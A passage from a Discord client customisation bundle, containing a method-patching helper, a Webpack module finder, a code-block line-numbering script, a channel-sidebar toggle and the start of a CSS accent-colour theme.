     * @param {doPatchCallback} options.instead Callback that will be called instead of original target method call. You can get access to original method using `originalMethod` parameter if you want to call it, but you do not have to. Can't be combined with `before` and `after`.
     * @param {boolean} [options.once=false] Set to true if you want automatically unpatch method after first call.
     * @param {boolean} [options.silent=false] Set to true if you want to suppress log messages about patching and unpatching. Useful to avoid clogging the console in case of frequent conditional patching/unpatching, for example from another monkeyPatch callback.
     * @param {boolean} [options.displayName] You can provide meaningful name of class/object provided in `what` param for logging purposes. By default there will be a try to determine name automatically.
     * @return {cancelPatch} Function with no arguments and no return value that should be called to cancel (unpatch) this patch. You should save and run it when your plugin is stopped.
     */
    const monkeyPatch = window.DiscordInternals && window.DiscordInternals.monkeyPatch || ((what, methodName, options) => {
        const {before, after, instead, once = false, silent = false} = options;
        const displayName = options.displayName || what.displayName || what.name || what.constructor.displayName || what.constructor.name;
        if (!silent) console.log('patch', methodName, 'of', displayName);
        const origMethod = what[methodName];
        const cancel = () => {
            if (!silent) console.log('unpatch', methodName, 'of', displayName);
            what[methodName] = origMethod;
        };
        what[methodName] = function() {
            /**
             * @interface
             * @name PatchData
             * @property {object} thisObject Original `this` value in current call of patched method.
             * @property {Arguments} methodArguments Original `arguments` object in current call of patched method. Please, never change function signatures, as it may cause a lot of problems in future.
             * @property {cancelPatch} cancelPatch Function with no arguments and no return value that may be called to reverse patching of current method. Calling this function prevents running of this callback on further original method calls.
             * @property {function} originalMethod Reference to the original method that is patched. You can use in if you need some special usage. You should explicitly provide this value and method arguments when you call this function.
             * @property {originalMethodCall} callOriginalMethod This is a shortcut for calling original method using this and arguments from data object.
             * @property {*} returnValue This is a value returned from original function call. This property is avilable only in `after` callback, or in `instead` callback after calling `callOriginalMethod` function
             */
            const data = {
                thisObject: this,
                methodArguments: arguments,
                cancelPatch: cancel,
                originalMethod: origMethod,
                callOriginalMethod: () => data.returnValue = data.originalMethod.apply(data.thisObject, data.methodArguments)
            };
            if (instead) {
                const tempRet = instead(data);
                if (tempRet !== undefined)
                    data.returnValue = tempRet;
            }
            else {
                if (before) before(data);
                data.callOriginalMethod();
                if (after) after(data);
            }
            if (once) cancel();
            return data.returnValue;
        };
        what[methodName].__monkeyPatched = true;
        what[methodName].displayName = 'patched ' + (what[methodName].displayName || methodName);
        return cancel;
    });

    /**
     * @author samogot
     */
    const WebpackModules = window.DiscordInternals && window.DiscordInternals.WebpackModules || (() => {

        const req = typeof(webpackJsonp) == "function" ? webpackJsonp([], {
                '__extra_id__': (module, exports, req) => exports.default = req
        }, ['__extra_id__']).default : webpackJsonp.push([[], {
                '__extra_id__': (module, exports, req) => module.exports = req
        }, [['__extra_id__']]]);
        delete req.m['__extra_id__'];
        delete req.c['__extra_id__'];

        /**
         * Predicate for searching module
         * @callback modulePredicate
         * @param {*} module Module to test
         * @return {boolean} Thue if it is module that you need
         */

        /**
         * Look through all modules of internal Discord's Webpack and return first one that match filter predicate.
         * At first this function will look thruogh alreary loaded modules cache. If no one of loaded modules is matched - then this function tries to load all modules and match for them. Loading any module may have unexpected side effects, like changing current locale of moment.js, so in that case there will be a warning the console. If no module matches - function will return null. You sould always take such predicate to match something, gut your code should be ready to recieve null in case if Discord update something in codebase.
         * If module is ES6 module and hafe default property - only default would be considered, otherwise - full module object.
         * @param {modulePredicate} filter Predicate to match module
         * @return {*} First module that matched by filter or null if none is matched.
         */
        const find = (filter) => {
            for (let i in req.c) {
                if (req.c.hasOwnProperty(i)) {
                    let m = req.c[i].exports;
                    if (m && m.__esModule && m.default)
                        m = m.default;
                    if (m && filter(m))
                        return m;
                }
            }
            console.warn('Cannot find loaded module in cache.');
            return null;
        };

        /**
         * Look through all modules of internal Discord's Webpack and return first object that has all of following properties. You should be ready that in any moment, after Discord update, this function may start returning null (if no such object exists any more) or even some different object with the same properties. So you should provide all property names that you use, and often even some extra properties to make sure you'll get exactly what you want.
         * @see Read {@link find} documentation for more details how search works
         * @param {string[]} propNames Array of property names to look for
         * @return {object} First module that matched by propNames or null if none is matched.
         */
        const findByUniqueProperties = (propNames) => find(module => propNames.every(prop => module[prop] !== undefined));

        /**
         * Look through all modules of internal Discord's Webpack and return first object that has displayName property with following value. This is useful for searching React components by name. Take into account that not all components are exported as modules. Also there might be several components with same names
         * @see Use {@link ReactComponents} as another way to get react components
         * @see Read {@link find} documentation for more details how search works
         * @param {string} displayName Display name property value to look for
         * @return {object} First module that matched by displayName or null if none is matched.
         */
        const findByDisplayName = (displayName) => find(module => module.displayName === displayName);

        return {find, findByUniqueProperties, findByDisplayName};

    })();

    window.setTimeout(start, 5000);
})();

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| CodeBlock Line Numbers |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
(function ($) {
    "use strict";

    // Helper function for finding all elements matching selector affected by a mutation
    function mutationFind(mutation, selector) {
        var target = $(mutation.target), addedNodes = $(mutation.addedNodes);
        var mutated = target.add(addedNodes).filter(selector);
        var descendants = addedNodes.find(selector);
        var ancestors = target.parents(selector);
        return mutated.add(descendants).add(ancestors);
    }

    // Watch for new code blocks
    new MutationObserver(function (mutations, observer) {
        mutations.forEach(function (mutation) {
            mutationFind(mutation, ".hljs").not(":has(ol)")
                .each(function () {
                    this.innerHTML = this.innerHTML.split("\n").map(line => "<li>"+line+"</li>").join("");
                })
                .wrapInner($("<ol>").addClass("kawaii-linenumbers"));
        });
    }).observe(document, { childList:true, subtree:true });
})(jQuery.noConflict(true));

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Channel Hide/Show ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

(function() {
    'use strict';

    // Classes of DIVs you want to be able to toggle sidebar
    const toggleButtons = [
        "children-19S4PO",
        "toggleChannelsBtn"
    ];
    const columnToHide = "sidebar-2K8pFh"
    const showHideSidebarButtonParentClass = "scroller-2TZvBN";
    //const showHideSidebarButtonParentClass = "wrapper-1Rf91z"; //top bar instead
    const roomDivClass = "containerDefault-1ZnADq";
    const unreadClass = "unread-3zKkbm";
    const channelsWidth = "240px";

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async function pageload() {
        // Wait 5 seconds for page to load
        await sleep(5000);
        main()
    }

    const toggleVisibility = function() {
        let sidebar = document.getElementsByClassName(columnToHide)[0];
        sidebar.style.transition = "width 150ms ease-out, opacity 150ms ease-out";
        if (sidebar.style.width == "1px") {
            sidebar.style.width = channelsWidth;
            sidebar.style.opacity = "1";
        } else {
            sidebar.style.width = "1px";
            sidebar.style.opacity = "0";
        }
    }

    let cheveronDirection = function() {
        const sidebar = document.getElementsByClassName(columnToHide)[0]
        const btn = document.getElementById("dtcb-cheverons")
        if (sidebar.style.width == "1px") {
            btn.innerText = "›"; // symbol for >
        } else {
            btn.innerText = "‹"; // symbol for <
        }
    }

    const createSidebarButton = function() {
        let btnDiv = document.createElement("div");
        btnDiv.setAttribute("class", "toggleChannelsBtn");
        btnDiv.setAttribute("id", "toggleChannelsBtn");
        btnDiv.style.width = "70px";
        btnDiv.style.color = "#FFFFFF";
        btnDiv.style.position = "absolute";
        btnDiv.style.top = "0";
        btnDiv.style.zIndex = "3";
        let btn = document.createElement("p");
        btn.setAttribute("id", "dtcb-cheverons");
        btn.innerText = "‹"; // symbol for <
        btn.style.margin = "0";
        btn.style.position = "fixed";
        btn.style.cursor = "pointer";
        btn.style.backgroundColor = "#36393f";
        btn.style.color = "unset";
        // btn.style.display = "inline-flex";
        btn.style.padding = "0px 6px 4px";
        btn.style.justifyContent = "center";
        btn.style.borderBottomRightRadius = "10px";
        btn.style.fontSize = "15px";
        btnDiv.appendChild(btn);
        return btnDiv;
    }

    const addListenersToToggleButtons = function() {
        toggleButtons.forEach(function(elem) {
            document.getElementsByClassName(elem)[0].addEventListener('click', function() {
                toggleVisibility();
                cheveronDirection();
            })
        });
    }

    const autohideSidebar = function() {
        const roomDivs = document.getElementsByClassName(roomDivClass)
        Array.from(roomDivs).forEach(function(room) {
            room.addEventListener('click', function() {
                toggleVisibility();
                cheveronDirection();
            })
        })
    }



    const main = function() {
        console.log("[*] Loading Discord Toggle Channenels Bar");
        const newBtn = createSidebarButton()
        document.getElementsByClassName(showHideSidebarButtonParentClass)[0].appendChild(newBtn)
        addListenersToToggleButtons();
        autohideSidebar();
    }

    pageload();
})();


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Theme 1 ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/


(function() {
let css = `
/* ==UserStyle==

/* USRBG | Adds custom Avatar Banner (made by Gibbu#1211 & Tropical#4355) */
@import url('https://discord-custom-covers.github.io/usrbg/dist/usrbg.css');

/* Blurple Recolor | Changed the basic accent color  (made by mwittrien)*/
/* @import url("https://mwittrien.github.io/BetterDiscordAddons/Themes/BlurpleRecolor/BlurpleRecolor.css"); */



@import url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/ThemeDevBadge.css);

:root {
	--daccentcolor: 114,137,218;
	--vaccentcolor: var(--accentcolor, var(--daccentcolor));
	--dlinkcolor: 0,176,244;
	--vlinkcolor: var(--linkcolor, var(--dlinkcolor));

	--dfontwhite1: 255,255,255;

	--vaccentcolor-hover: rgb(var(--vaccentcolor)) linear-gradient(0deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0.15));
	--vaccentcolor-active: rgb(var(--vaccentcolor)) linear-gradient(0deg, rgba(255, 255, 255, 0.3), rgba(255, 255, 255, 0.3));

	--bdfdb-blurple: rgb(var(--vaccentcolor)) !important;
	--bd-blue: rgb(var(--vaccentcolor)) !important;
	--bd-blue-hover: var(--vaccentcolor-hover) !important;
	--bd-blue-active: var(--vaccentcolor-active) !important;
	--blurple: rgb(var(--vaccentcolor)) !important;
}
.content-1o0f9g {
    background: var(--background-primary) !important; }
.theme-dark, .theme-light {
	--text-link: rgb(var(--vlinkcolor));
	--focus-primary: rgb(var(--vlinkcolor));
	--radio-group-dot-foreground: rgb(var(--vaccentcolor));
}
.theme-light {
	--logo-primary: rgb(var(--vaccentcolor));
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Plugin Themes ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.hljs ol {
    list-style: none;
    counter-reset: linenumbers;
}

.hljs ol li {
    text-indent: -4ch;
    margin-left: 3.5ch;
    padding-left: 0.5ch;
    border-left: 1px solid rgba(0,0,0,0.2);
}

.hljs ol li::before {
    color: rgba(127,127,127,0.5);
    display: inline-block;
    width: 3ch;
    margin-right: 0.5ch;
    padding-right: 0.5ch;
    text-align: right;
    counter-increment: linenumbers;
    content: counter(linenumbers);
    -webkit-user-select: none;
    user-select: none;
}

/* ~~~~		0.		TABLE OF CONTENTS				~~~~ */
/*
	1.	GUILDLIST
	2.	CHANNELLIST
	3.	CHAT
		1.	MESSAGES
		2.	TEXTAREA
		3.	AUTOCOMPLETEMENU
		4.	MEMBERLIST
		5.	SEARCHPAGE
		6.	CALL
	4.	PEOPLES
	5.	STORE/NITRO
	6.	LIBRARY
	7.	DISCOVERY
	8.	USERSETTINGS
	9.	GUILDSETTINGS
	10.	MODALS
		1.	USERMODAL
		2.	GUILDADD/CREATION
		3.	REGIONSELECTMODAL
		4.	UPLOADMODAL
		5.	KEYBOARDSHORTCUTSMODAL
		6.	LOGINSCREEN
		7.	DOWNLOADAPPMODAL
		8.	GUILDBOOSTMODAL
		9.	STREAMSETTINGSMODAL
		10.	DISPATCHERRORMODAL
		11.	CHANGELOGMODAL
		12.	SCREENSHAREMODAL
		13.	PHONEVERIFICATIONMODAL
	11.	POPOUTS
		1.	CONTEXTMENU
		2.	USERPOPOUT
		3.	EMOJIPICKER
		4.	PINS/MENTIONS
		5.	SEARCHPOPOUT
	12.	GENERAL
		1.	TEXT
		2.	BUTTONS
		3.	INPUTS
		4.	TAGS
		5.	ICONS
		6.	SCROLLBARS
		7.	NOTIFICATIONBAR
		8.	TOOLTIPS
		9.	TOASTS
	13.	BDSUPPORT
	14.	POWERCORDSUPPORT
	15.	PLUGINSUPPORT
		1.	IMAGEZOOM
		2.	HIDEUTILS
		3.	READALLNOTIFICATIONSBUTTON
		4.	SERVERSEARCH
		5.	CHANNELTABS
	16.	THEMESUPPORT
		1.	THEMEDEVBADGE
*/


/* ~~~~		1.		GUILDLIST						~~~~ */

.wrapper-1BJsBx.selected-bZ3Lue .childWrapper-anI2G9,		/* home/acronym												*/
.wrapper-1BJsBx:hover .childWrapper-anI2G9 {
	background-color: rgb(var(--vaccentcolor));
}

.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.4)"] {
	background-color: rgba(var(--vaccentcolor), 0.4) !important;
}
.folderIconWrapper-226oVY svg[style^="color: rgb(114, 137, 218)"],
.folderIconWrapper-226oVY svg[style*=" color: rgb(114, 137, 218)"] {
	color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		2.		CHANNELLIST						~~~~ */

.background-2uufRq {										/* guild header			partnerbadge						*/
	color: rgb(var(--vaccentcolor));
}
.iconTierThree-3EAOB7 {										/* guild header			icontier3							*/
	color: rgb(var(--vaccentcolor));
}
.subscribeTooltipWrapper-32-Ce8 {							/* guild header			subscribetooltip					*/
	background-color: rgb(var(--vaccentcolor));
}
.subscribeTooltipWrapper-32-Ce8::after {
	border-bottom-color: rgb(var(--vaccentcolor));
}

.channelNotice-1-XFjC::before,								/* channel notice											*/
.channelNotice-1-XFjC::after,
.channelNotice-3DDmsB::before,
.channelNotice-3DDmsB::after,
#app-mount .channelNotice-3hkOiI::before,
#app-mount .channelNotice-3hkOiI::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events:none;
}
.channelNotice-1-XFjC.quickswitcher-35bYg4 {
	background: transparent;
}
.channelNotice-1-XFjC.quickswitcher-35bYg4::before {
	filter: grayscale(0.5);
	background: url(https://discord.com/assets/8fdb69b7684b8e1ecb3fdde909daca41.svg) center 35px no-repeat;
}
.channelNotice-1-XFjC.premiumGuildSubscription-3oKecP {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/channelnotice_premium_bg.svg) center 23px no-repeat;
}
.channelNotice-1-XFjC.premiumGuildSubscription-3oKecP::after {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/channelnotice_premium_accent.svg) center 23px no-repeat;
}
.channelNotice-1-XFjC.publicUpsell-31ZSJ8::before {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/channelnotice_upsell_bg.svg) center 12px no-repeat;
}
.channelNotice-1-XFjC.publicUpsell-31ZSJ8::after {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/channelnotice_upsell_accent.svg) center 12px no-repeat;
}


/* ~~~~		3.		CHAT							~~~~ */

/* ----		3.1.	MESSAGES						---- */

.newMessagesBar-265mhP {									/* new messagesbar											*/
	background-color: rgb(var(--vaccentcolor));
}

.hasMore-3POVhk {											/* hasmore messagesbar										*/
	color: rgb(var(--vaccentcolor));
}

.backgroundFlash-24qWLN[style*="background-color: rgb(114, 137, 218)"],
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 1"] {
	background-color: rgba(var(--vaccentcolor), 1) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.9"] {
	background-color: rgba(var(--vaccentcolor), 0.9) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.8"] {
	background-color: rgba(var(--vaccentcolor), 0.8) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.7"] {
	background-color: rgba(var(--vaccentcolor), 0.7) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.6"] {
	background-color: rgba(var(--vaccentcolor), 0.6) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.5"] {
	background-color: rgba(var(--vaccentcolor), 0.5) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.4"] {
	background-color: rgba(var(--vaccentcolor), 0.4) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.3"] {
	background-color: rgba(var(--vaccentcolor), 0.3) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.2"] {
	background-color: rgba(var(--vaccentcolor), 0.2) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.1"] {
	background-color: rgba(var(--vaccentcolor), 0.1) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.0"] {
	background-color: rgba(var(--vaccentcolor), 0.0) !important;
}

.embedFull-2tM8--[style*="border-color: rgb(114, 137, 218)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}

.ephemeral-1PsL1r,											/* localbot				container							*/
.replying-1x3H0T {											/* replying				container							*/
	background-color: rgba(var(--vaccentcolor), 0.05);
}
.ephemeral-1PsL1r::before,									/* localbot				before								*/
.replying-1x3H0T::before {									/* replying				before								*/
	background-color: rgb(var(--vaccentcolor));
}
.message-2qnXI6.ephemeral-1PsL1r.selected-2P5D_Z,
.mouse-mode.full-motion .ephemeral-1PsL1r:hover,
.mouse-mode .ephemeral-1PsL1r:hover,
.message-2qnXI6.replying-1x3H0T.selected-2P5D_Z,
.mouse-mode.full-motion .replying-1x3H0T:hover,
.mouse-mode .replying-1x3H0T:hover {
	background-color: rgba(var(--vaccentcolor), 0.1);
}
.ephemeralMessage-1fEWtQ a {								/* localbot				operations							*/
	color: rgb(var(--vaccentcolor));
}

.operations-36ENbA > a {									/* message				operations							*/
	color: rgb(var(--vaccentcolor));
}

.icon-360yEu {												/* systemmessage		guild sub easter egg icon			*/
	color: rgb(var(--vaccentcolor));
}

.message-15tBk4 strong,										/* mention				in header							*/
.wrapper-3WhCwL {											/* mention													*/
	background-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}
.message-15tBk4 strong:hover,
.interactive:hover {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .mentioned-xhSam7 .mention.interactive:hover {
	color: rgb(var(--vaccentcolor));
}

.reactionMe-wv5HKu .reactionCount-2mvXRV,					/* reaction				count me							*/
.reactionMe-wv5HKu:hover .reactionCount-2mvXRV {
	color: rgb(var(--vaccentcolor));
}
.reaction-1hd86g.reactionMe-wv5HKu {						/* reaction				wrapper me							*/
	background-color: rgba(var(--vaccentcolor), 0.3);
}
															/* attachment			upload bar							*/
.progressBar-3u8FBM[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		3.2.	TEXTAREA						---- */
															/* textarea				follow channel icon					*/
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/chatnotice_followchannel_bg.svg) center/contain no-repeat;
}
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] + * {
	overflow: visible;
}
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] + *::after {
	content: "";
	position: absolute;
	bottom: 8px;
	left: 16px;
	width: 47px;
	height: 60px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/chatnotice_followchannel_accent.svg) center/contain no-repeat;
}

/* ----		3.3.	AUTOCOMPLETEMENU				---- */

#app-mount .active-2awTSY {									/* autocomplete			option active						*/
	background-color: rgb(var(--vaccentcolor));
}

#app-mount .searchSuggestion-2K8OBX:hover {					/* gifpicker			suggestions							*/
	border-color: rgb(var(--vaccentcolor));
	background-color: rgb(var(--vaccentcolor));
}
.result-3w1ZcL[style*="background-color"] {					/* gifpicker			result loading						*/
	background-color: rgb(var(--vaccentcolor)) !important;
}
.result-3w1ZcL[style*="background-color: rgb(146, 154, 250)"] {
	background: var(--vaccentcolor-hover) !important;
}
.result-3w1ZcL[style*="background-color: rgb(179, 174, 255)"] {
	background: var(--vaccentcolor-active) !important;
}
.theme-light .focused-1En8bG::after,						/* gifpicker			result hover						*/
.theme-light .result-3w1ZcL:hover::after {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor)), inset 0 0 0 3px #dcddde;
}
.theme-dark .focused-1En8bG::after,							/* gifpicker			result hover						*/
.theme-dark .result-3w1ZcL:hover::after {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor)), inset 0 0 0 3px #2f3136;
}
#app-mount .categoryFadeBlurple-1j72_A {					/* gifpicker			categoryfade						*/
	background-color: rgba(var(--vaccentcolor), 0.8);
}
#app-mount .categoryFadeBlurple-1j72_A:hover {
	background-color: rgba(var(--vaccentcolor), 0.95);
}
.introductionAction-M1r6AX {								/* gifpicker			introductionaction tooltip			*/
	color: rgb(var(--vaccentcolor));
}

/* ----		3.4.	MEMBERLIST						---- */

.premiumIcon-1rDbWQ {
	color: rgb(var(--vaccentcolor));
}

/* ----		3.5.	SEARCHPAGE						---- */

.noResultsImage-3Y0eCI.alt-3EpRdH {
	display: flex;
}
.noResultsImage-3Y0eCI.alt-3EpRdH::before {
	content: "";
	position: absolute;
	width: 160px;
	height: 160px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/searchpage_noresults_accent.svg) center/cover no-repeat;
}

/* ----		3.6.	CALL							---- */

.sparkleBlurple-awNnsZ {
	background-image: url(https://discordapp.com/assets/c7539bb38577495f5021c8ea455c7145.png);
}
.popBlurple-27zBE3 {
	background-image: url(https://discordapp.com/assets/237a2f9325a83d230fb30b2cd63bbfe6.png);
}
.lightBlurple-1mZKpk {
	background-image: url(https://discordapp.com/assets/1c20f6ecd2d83c1844a3fd6da306d239.png);
}
.crossBlurple--iGG5Y {
	background-image: url(https://discordapp.com/assets/c13a0b03a798023c27155fad5f0c7a61.png);
}


/* ~~~~		4.		PEOPLES							~~~~ */

.wrapper-1cBijl .btn:disabled {								/* addfriendpage		button								*/
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		5.		STORE/NITRO						~~~~ */

#app-mount .premiumIndicator-1XvbfM {						/* premium				where?								*/
	background-color: rgb(var(--vaccentcolor));
}

.gridItemGuildSubscription-1sZ0fD::before {
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(162, 48, 194), rgba(162, 48, 194, 0.5));
}
.gridItemBadge-1Se-Pu::before {
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.activeTransferGuildCardBorder-2jUQ7t{
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.premiumGuildSubscriptionRowActive-1WxLXI{
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.theme-light .animationContainer-cNePAf {
	color: rgb(var(--vaccentcolor));
}
.theme-light .shine-KMI5j7 {
	color: rgba(var(--vaccentcolor), 0.2);
}

.grandfatheredMessage-1BnHtv {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.tierGrandfathered-R6zrrD.banner-3Kac2g {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.tier1-UUxEBG,
.headerTier1-2Ckjmd,										/* submodal				tier1 header						*/
.tier1HeaderBackground-3LjWgU {								/* submodal				tier1 bg							*/
	background-color: rgb(var(--vaccentcolor));
}
.headerTier1-2Ckjmd .wrapper-1P_m9K image:not([width="170px"]),
.tier1HeaderBackground-3LjWgU .wrapper-1P_m9K image:not([width="170px"]) {
	display: none !important;
}
.tier1-1ttHRY.banner-3Kac2g {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.tier2-3pW_6T,
.headerTier2-3FKMxd,										/* submodal				tier2 header						*/
.tier2HeaderBackground-2BUqcl {								/* submodal				tier2 bg							*/
	background: #ffcd4b linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.tier2-3hSil0.banner-3Kac2g {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.price-1rEl-z {												/* submodal				price								*/
	color: rgb(var(--vaccentcolor));
}

.iconBackgroundTier1-2GOcU8 {								/* tierlist				tier1 bg							*/
	background: rgb(255, 255, 255) linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.iconBackgroundTier2-2TeI3a {								/* tierlist				tier2 bg							*/
	background: #ffcd4b linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.xboxPromotion-1k0m0c {										/* bannerpromo			xboxpromo							*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.bannerPromotionLogoPremium-2cB301 {						/* bannerpromo			logo								*/
	background: #ffcd4b linear-gradient(rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.premiumLogo-1D3iJc {										/* bannerpromo			nitro logo							*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

#app-mount .tag-HanR-9 {									/* tag														*/
	background: rgb(255, 255, 255) linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .tag-HanR-9::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/04a2e1509ad72be575b1529b51ea3977.svg) top/cover no-repeat;
}

.skuButtonTier1-2XTq5D,
.skuButtonTier1-3-EFd9 {
	background: rgb(255, 255, 255) linear-gradient(32.3deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}
.skuButtonTier2-2asv3-,
.skuButtonTier2-i01WfL {
	background: #ffcd4b linear-gradient(32.3deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

#app-mount .alternativeSkuSelected-3Qhw9n {
	background-color: rgb(var(--vaccentcolor));
}

.overlappingBorder-1-XPGl {									/* store				preview image						*/
	border-color: rgb(var(--vaccentcolor));
}

#app-mount .headerFancy-1AcCLF {							/* store				header fancy						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .premiumHeaderPrice-1F1CMD {						/* store				price								*/
	background-color: rgb(var(--vaccentcolor));
}
.premiumCircle-3jgziV {										/* store				premiumcircle						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .staffIcon-2MB1se {								/* store				stafficon							*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .nitroIcon-2uS3VJ {								/* store				nitroicon							*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.perkTag-2O4dx4 {											/* store				perktag								*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.confirmPremiumIcon-26GX5Y,									/* store				confirmpremiumicon					*/
.gameIcon-gg34Dz[style*="/assets/f6cbcdc9366fb8d31e03bdc6c9c50246.svg"] {
	background-color: rgb(255, 255, 255) !important;
	background-image: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/nitrobadge_details.svg), linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5)) !important;
}
.pageWrapper-3F6owx {										/* store				pagewrapper							*/
	background: white linear-gradient(114deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.6));
}


/* ~~~~		6.		LIBRARY							~~~~ */

.foreground-2aE44H {										/* installationpath		fill								*/
	stroke: rgb(var(--vaccentcolor));
}


/* ~~~~		7.		DISCOVERY						~~~~ */

.searchBox-3Y2Vi7:focus,									/* searchbox			focus								*/
.searchBox-3Y2Vi7:focus-within,
.searchPage-3GKAdT .search-1iTphC .searchBox-2_mAlO:focus,
.searchPage-3GKAdT .search-1iTphC .searchBox-2_mAlO:focus-within {
	border-color: rgb(var(--vaccentcolor));
}
.search-1iTphC .searchBox-2_mAlO:focus,
.search-1iTphC .searchBox-2_mAlO:focus-within {
